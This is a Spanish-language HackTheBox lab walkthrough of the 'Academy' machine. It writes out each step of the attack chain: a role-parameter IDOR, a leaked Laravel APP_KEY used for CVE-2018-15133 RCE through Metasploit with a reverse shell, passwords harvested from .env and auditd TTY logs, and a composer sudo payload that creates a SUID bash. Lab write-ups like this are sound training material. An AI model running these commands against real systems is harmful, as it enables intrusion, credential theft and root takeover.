HackTheBox 2026-08-06

HTB Academy — IDOR de rol, Laravel APP_KEY leak (RCE) y escalada por logs de auditoría

Máquina Linux fácil que replica la plataforma de entrenamiento de HackTheBox. La cadena arranca con un IDOR en el registro para volverse admin, sigue con una fuga de APP_KEY de Laravel en debug mode (CVE-2018-15133 → RCE), reutilización de credenciales para SSH, y termina en root leyendo contraseñas en los logs de auditoría TTY y abusando de composer con sudo.

IDOR Laravel CVE-2018-15133 PrivEsc GTFOBins

Academy es una máquina Linux de dificultad fácil que simula la propia plataforma de HackTheBox. Es una práctica excelente para bug bounty web porque encadena vectores muy reales: un IDOR de privilegios, un secreto filtrado por una configuración de debug mal puesta, reutilización de contraseñas y una escalada por un binario que nunca debería correr con sudo.

Cadena de ataque

  1. IDOR en registro → cuenta de administrador. El parámetro roleid del POST de registro se modifica de 0 a 1.
  2. Laravel debug mode → APP_KEY expuesta. El panel admin revela un subdominio de staging cuyo error 500 filtra toda la configuración.
  3. CVE-2018-15133 → shell como www-data. Deserialización PHP vía X-XSRF-TOKEN firmando el payload con la APP_KEY.
  4. Credenciales en .env → SSH como cry0l1t3. El .env de la app principal tiene una contraseña reutilizada en SSH.
  5. Grupo adm → aureport → contraseña de mrb3n. Los logs TTY de auditd registraron la contraseña tecleada en una sesión anterior.
  6. sudo composer → root. GTFOBins: composer ejecuta scripts arbitrarios como root.

Paso 1 — Enumeración

Escaneo de puertos con Nmap

Lo primero siempre es saber qué servicios están expuestos. Nmap con detección de versiones (-sV) y scripts básicos (-sC):

$ nmap -sV -sC -oN nmap_academy.txt academy.htb

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
33060/tcp open  mysqlx   # Puerto alternativo de MySQL, sin acceso externo

El 33060 es MySQL X Protocol y sin credenciales no hay nada que hacer ahí. El vector inicial casi siempre es el servicio HTTP.

Enumeración web

El sitio muestra un login y un registro. Mientras se explora a mano, en paralelo corre dirsearch buscando rutas ocultas:

$ dirsearch -u http://academy.htb -e php

[200] /index.php
[200] /login.php
[200] /register.php
[200] /admin.php   # Panel administrativo — normalmente requeriría privilegios

Aparece /admin.php, pero con una cuenta normal la app redirige al login. La pregunta clave es: ¿cómo conseguimos acceso de admin?

Paso 2 — IDOR en el registro: escalada de rol

💡
¿Qué es un IDOR? Insecure Direct Object Reference: la app deja que el cliente controle una referencia a un objeto sin validar permisos. Acá el "objeto" es el rol del usuario: el servidor debería asignarlo internamente, nunca aceptarlo del request.

Al registrar una cuenta y capturar el POST con Burp Suite, el cuerpo revela un parámetro que no está en el formulario HTML visible:

POST /register.php HTTP/1.1
Host: academy.htb
Content-Type: application/x-www-form-urlencoded

uid=attacker&password=pass123&confirm=pass123&roleid=0

Cambiando roleid=0 por roleid=1 antes de enviarlo, la cuenta se crea con privilegios de administrador y /admin.php concede el acceso.

🎯
Impacto en bug bounty. Un IDOR de privilegio en el registro es de severidad alta/crítica: cualquiera se crea una cuenta admin sin control. En la práctica se buscan campos como role, is_admin, account_type, plan — parámetros que el formulario no muestra pero el POST sí incluye.

Dentro del panel, una tarea pendiente filtra un subdominio de desarrollo:

Fix issue with dev-staging-01.academy.htb    pending

Se agrega al /etc/hosts:

$ echo "10.10.10.215  academy.htb dev-staging-01.academy.htb" >> /etc/hosts

Paso 3 — Laravel APP_KEY leak → RCE (CVE-2018-15133)

Al entrar a http://dev-staging-01.academy.htb, Laravel devuelve un error 500 gigante: la app corre con APP_DEBUG=true, algo que nunca debería estar activo en algo accesible desde afuera. La página de error (Ignition) expone toda la config, incluida la APP_KEY:

# Datos críticos expuestos en la página de error:

APP_KEY    = base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
DB_HOST    = 127.0.0.1
DB_DATABASE= homestead
DB_USERNAME= homestead
DB_PASSWORD= secret
🔑
¿Para qué sirve la APP_KEY? Es la clave maestra de cifrado de Laravel: cifra las cookies de sesión (AES-256-CBC), firma los tokens CSRF y cifra cualquier dato con encrypt(). En CVE-2018-15133, el header X-XSRF-TOKEN se descifra y luego se deserializa en PHP sin validación: si firmás un payload malicioso con la APP_KEY, Laravel lo ejecuta al deserializarlo.

Explotación con Metasploit

msf> use exploit/unix/http/laravel_token_unserialize_exec
msf> set RHOSTS academy.htb
msf> set VHOST dev-staging-01.academy.htb
msf> set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf> set LHOST 10.10.15.4
msf> exploit

[*] Command shell session 1 opened
$ whoami
www-data
🛠️
Alternativa sin Metasploit (OSCP-friendly). Existe el exploit manual exploit_laravel_cve-2018-15133 en GitHub, que usa phpggc para generar el gadget chain serializado y lo envía directo con Python.

Paso 4 — Movimiento lateral: cry0l1t3 (user flag)

Como www-data tenemos acceso a los archivos de la app. En Laravel, el .env guarda toda la config sensible. Se busca en el directorio web:

$ find /var/www -name ".env" 2>/dev/null
/var/www/html/htb-academy-dev-01/.env   # el de staging (ya visto)
/var/www/html/academy/.env              # el de la app principal

$ cat /var/www/html/academy/.env
...
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!      # credencial interesante
♻️
Password spraying. Una contraseña de un archivo de config rara vez sirve solo para la base de datos: la reutilización es de los problemas más comunes en entornos reales. La probamos contra los usuarios del sistema.

Entre los usuarios con shell aparece cry0l1t3, que tiene el user.txt. La contraseña del .env funciona para su SSH:

$ ssh cry0l1t3@academy.htb
Password: mySup3rP4s5w0rd!!

cry0l1t3@academy:~$ cat user.txt
[ USER FLAG ]

Paso 5 — Escalada de privilegios → root

Reconocimiento como cry0l1t3

cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
📜
El grupo adm en Debian/Ubuntu da lectura a los logs de /var/log/, incluidos los de auditoría (auditd). En ciertos modos, auditd registra todo lo que se teclea en las terminales (sesiones TTY).

Leyendo logs TTY con aureport

aureport --tty genera el reporte de las sesiones de terminal — literalmente lo que los usuarios tipearon:

cry0l1t3@academy:~$ aureport --tty

# date time event auid term sess comm data
1  ...  83  0  ?  1  sh    "bash"
2  ...  84  0  ?  1  bash  "su mrb3n"
3  ...  85  0  ?  1  su    "mrb3n_Ac@d3my!"
4  ...  86  0  ?  1  su    ""

Cuando alguien corre su mrb3n, tipea la contraseña en la terminal. En modo TTY, auditd captura los caracteres reales (los asteriscos son solo visuales — el kernel ya los registró). Por eso los logs de auditoría deben estar bien protegidos.

Acceso como mrb3n y análisis de sudo

cry0l1t3@academy:~$ su mrb3n
Password: mrb3n_Ac@d3my!

mrb3n@academy:~$ sudo -l
User mrb3n may run the following commands on academy:
    (root) /usr/bin/python3 /usr/bin/composer
📦
composer + sudo = peligro. composer (gestor de dependencias de PHP) tiene un sistema de scripts definidos en composer.json que se ejecutan como procesos del SO. Si lo corrés como root y controlás el composer.json, root ejecuta lo que quieras. Está documentado en GTFOBins.

GTFOBins: composer → root shell

Creamos un composer.json con un script que le da SUID a una copia de /bin/bash, y lo ejecutamos con sudo:

mrb3n@academy:~$ echo '{"scripts":{"x":"cp /bin/bash /tmp/bash && chmod +s /tmp/bash"}}' > composer.json

mrb3n@academy:~$ sudo composer run-script x
> cp /bin/bash /tmp/bash && chmod +s /tmp/bash

mrb3n@academy:~$ ls -la /tmp/bash
-rwsr-sr-x 1 root root 1183448 /tmp/bash

El bit SUID hace que el binario corra con los privilegios del propietario (root). Con -p, bash no descarta el UID efectivo elevado:

mrb3n@academy:~$ /tmp/bash -p

bash-5.0# id
uid=1001(mrb3n) gid=1001(mrb3n) euid=0(root) egid=0(root)

bash-5.0# cat /root/root.txt
[ ROOT FLAG ]

Lecciones para bug bounty y pentesting

  • Interceptá siempre los formularios de registro. El HTML muestra solo los campos visibles, pero el POST puede llevar parámetros ocultos (role, is_admin, account_type, plan, subscription).
  • Laravel en debug mode es crítico. APP_DEBUG=true accesible desde internet expone rutas, versiones, config completa y —en versiones viejas— la APP_KEY. Provocar un error y ver si aparece Ignition es un check rutinario.
  • Los .env son minas de oro. Buscar .env, config.php, web.config, database.yml debe ser automático: credenciales, API keys, claves de cifrado — y casi siempre reutilizadas.
  • El grupo adm revela info sensible. Con auditoría activa, aureport --tty puede escupir contraseñas tecleadas en sesiones anteriores.
  • GTFOBins es referencia obligada. Documenta cómo binarios legítimos escalan privilegios con sudo/SUID. Revisá el arsenal disponible contra GTFOBins en cada pentest.
